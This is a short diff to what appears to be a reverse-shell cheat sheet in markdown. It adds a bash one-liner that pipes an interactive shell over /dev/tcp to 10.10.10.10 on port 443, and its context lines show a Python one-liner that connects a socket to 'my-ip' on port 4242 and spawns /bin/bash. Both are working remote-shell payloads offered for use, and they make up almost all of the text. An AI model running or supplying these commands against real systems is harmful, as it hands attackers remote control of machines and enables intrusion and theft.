@@ -1,3 +1,8 @@
+## Linux TCP Socket shell
+```
+bash -i >& /dev/tcp/10.10.10.10/443 0>&1
+```
+
 ### Python Reverse shell
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("my-ip",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
